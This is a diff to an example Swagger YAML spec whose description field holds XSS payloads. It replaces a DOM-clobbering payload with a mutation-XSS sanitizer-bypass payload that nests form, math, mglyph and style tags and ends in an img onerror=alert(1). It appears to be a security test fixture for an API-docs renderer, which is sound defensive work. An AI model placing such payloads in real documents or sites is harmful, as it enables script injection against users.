@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Example yaml.spec
   description: |
-    <form id="x "> <r*504> <a> <svg> <image> <a> <desc> <svg> <image></image> </svg> </desc> </a> </image> <style><a id="</style><img src=x onerror=alert(1)>"></a></style> </svg> </a> </form> <input form="x" name="__depth">
+    <form><math><mtext><form><mglyph><style></math><img src onerror=alert(1)></style></mglyph></form></mtext></math></form>
 paths:
   /accounts:
     get:
